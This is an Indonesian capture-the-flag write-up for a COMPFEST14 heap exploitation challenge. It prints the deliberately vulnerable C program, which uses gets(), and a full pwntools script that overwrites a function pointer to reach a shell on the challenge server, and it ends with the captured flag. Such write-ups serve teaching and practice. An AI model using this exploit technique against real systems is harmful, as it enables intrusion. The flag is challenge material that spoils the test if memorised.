# Binary Exploitation Is Ez

> Write-up author: jon-brandy (SOLVED)

## DESKRIPSI:
Take a break, here's an easy problem

`nc 103.185.38.238 15733`.

## LANGKAH-LANGKAH:
1. Pertama, unduh file `.zip` yang diberikan.
2. Lalu unzip file tersebut.

> HASIL

![image](https://user-images.githubusercontent.com/70703371/185915611-1fe7b5e3-1657-4458-ac2b-f52226ab84e4.png)

3. Selanjutnya, cek file program `ez` yang diberikan.

> NOTES

```
Jalankan -> file ez dan checksec --file ez
```

> OUTPUT 

![image](https://user-images.githubusercontent.com/70703371/185915855-b5245817-288b-4e9b-83cb-9b6c4163ac41.png)

![image](https://user-images.githubusercontent.com/70703371/185915909-84d1736a-25f6-4344-b707-d71699443658.png)

4. Nampaknya, file *not stripped* (menandakan kita masih dapat melihat fungsi pada source-code) dan tidak ada protektor PIE (menandakan memory yang tersimpan tidak akan berubah).
5. Selanjutnya saya melakukan pengecekan pada source-code.

> ez.c

```c

#include<stdio.h>
#include<stdlib.h>

struct meme
{
	void (*func)(char*);
	char* content;
};


struct meme** memes;


void init()	{
	setvbuf(stdout, NULL, _IONBF, 0);
	memes = malloc(8 * sizeof(void *));
}

unsigned int read_int()	{
	char buf[16];
	fgets(buf, 16, stdin);
	return strtoul(buf, NULL, 10);
}

void print_menu()	{
	puts("===Meme Creator===");
	puts("1. New Meme");
	puts("2. Edit Meme");
	puts("3. Print Meme");
	puts("4. Exit");
	puts("==================");
	printf("Choice: ");
}

void EZ_WIN()	{
	puts("EAAAAAAAAAAAASYYYYYYYYYYYYY");
	system("/bin/sh");
	exit(0);
}

void my_print(char* buf)	{
	printf("Content: %s\n", buf);
}

void new_meme()	{
	unsigned int size;
	printf("Enter meme size: ");
	size = read_int();
	if(size > 0x200)	{
		puts("Please, noone wants to read the entire bee movie script");
		exit(-1);
	}
	int i = 0;
	while(memes[i] != NULL && ++i < 8);
	if(i == 8)	{
		puts("No more memes for you!");
		exit(-1);
	}
	memes[i] = malloc(8);
	memes[i]->func = &my_print;
	memes[i]->content = malloc(size);
	printf("Enter meme content: ");
	fgets(memes[i]->content, size, stdin);
	puts("Done!");
}

void edit_meme()	{
	unsigned int idx;
	printf("Index: ");
	idx = read_int();
	if(memes[idx] == NULL)	{
		puts("There's no meme there!");
		return;
	}
	printf("Enter meme content: ");
	gets(memes[idx]->content);
	puts("Done!");
}

void print_meme()	{
	unsigned int idx;
	printf("Index: ");
	idx = read_int();
	if(memes[idx] == NULL)	{
		puts("There's no meme there!");
		return;
	}
	(*(memes[idx]->func))(memes[idx]->content);
}

int main(int argc, char const *argv[])
{
	unsigned int choice;

	init();
	while(1)	{
		print_menu();
		choice = read_int();
		switch(choice)	{
			case 1:
				new_meme();
				break;
			case 2:
				edit_meme();
				break;
			case 3:
				print_meme();
				break;	
			case 4:
				puts("Bye bye!");
				exit(0);
				break;
			default:
				puts("Invalid choice!");
				break;
		}
	}
	return 0;
}
```

6. Setelah di analisis, sepertinya kita dapat memanfaatkan vuln dari fungsi `edit_meme` dikarenakan terdapat pemanggilan fungsi `gets`.

> NOTES

```
Melakukan buffer overflow sehingga mengoverwrite variable func sehingga memiliki address dari fungsi EZ_WIN()
```

> FUNGSI EDIT_MEME()

![image](https://user-images.githubusercontent.com/70703371/185917424-981dc78e-908d-45f5-94d0-dee55a0b2af2.png)

7. Diketahui pada fungsi `print_meme` akan memberikan output dari fungsi EZ_WIN() yang telah ditulis addressnya.

![image](https://user-images.githubusercontent.com/70703371/185918169-ceec300c-ea7b-49e6-960c-37cd7ac062c0.png)

> STRUCT

![image](https://user-images.githubusercontent.com/70703371/185918264-959cdbbb-f27d-441e-8966-4933b612e787.png)

8. Konsep yang akan diterapkan disini yaitu `buffer overflow`, `ret2win`, dan `basic heap`.
9. Maka dari itu saya membuat sebuah skrip python sebagai berikut:

```py
import os
from pwn import *

ezAddr = 0x4014a0

def fun_add(r):
    r.recvuntil('size: ')
    r.sendline('10')
    r.recvuntil('content: ')
    r.sendline('AAAA')


def fun_edit(r):
    r.recvuntil('Index: ')
    r.sendline('0')
    p = b'A' * 24
    p += p64(0x21)
    p += p64(ezAddr)
    r.sendline(p)

os.system('cls')

sh = remote('103.185.38.238', 15733)

sh.recvuntil('Choice: ')
sh.sendline('1')
fun_add(sh)
sh.recvuntil('Choice: ')
sh.sendline('1')
fun_add(sh)
sh.recvuntil('Choice: ')
sh.sendline('2')
fun_edit(sh)
sh.recvuntil('Choice: ')
sh.sendline('3')
sh.recvuntil('Index: ')
sh.sendline('1')

sh.interactive()
```

10. Pada variable `ezAddr` saya isi dengan address dari fungsi EZ_WIN, untuk mendapatkan addressnya, saya menggunakan `gdp-peda`.

> TAHAPAN

```
1. gdb ez
2. info functions
3. info address EZ_WIN
```

> GDB EZ

![image](https://user-images.githubusercontent.com/70703371/185922449-ca895d35-bb11-4f66-a800-1ddfa1df1977.png)

> INFO FUNCTIONS

![image](https://user-images.githubusercontent.com/70703371/185922509-e4731862-e9d9-43b9-97a2-ccf150b18e5b.png)

> INFO ADDRESS EZ_WIN

![image](https://user-images.githubusercontent.com/70703371/185922596-a6b138a8-b1a7-43e8-9104-c103714e7939.png)

11. Lalu saya mengubah hexa dari 0x21 dan address EZ_WIN ke dalam bentuk **raw bytes** dengan fungsi `p64`.
12. Jalankan skrip.

> HASIL

![image](https://user-images.githubusercontent.com/70703371/185922986-16399ec8-81e0-440e-af44-7cc6ff793cff.png)

13. Jalankan `ls` untuk melihat isi dari direktori `/bin/sh`.

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/185924033-340eb81e-5f56-424c-8c2f-ee88c3c49bdd.png)

14. Jalankan `cat flag.txt`.

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/185924897-a1fe5868-8acd-45d8-a3d7-0150451a2263.png)

15. Flag pun didapat!

## FLAG

```
COMPFEST14{C_i_told_u_its_ez_loooooooool_257505}
```

## REFERENCES:

```
https://www.imperva.com/learn/application-security/buffer-overflow/
https://www.youtube.com/c/CyberSecurityIPB
https://int0x33.medium.com/day-1-rop-emporium-ret2win-64bit-bb0d1893a3b0
https://ctf101.org/binary-exploitation/heap-exploitation/
https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10
```


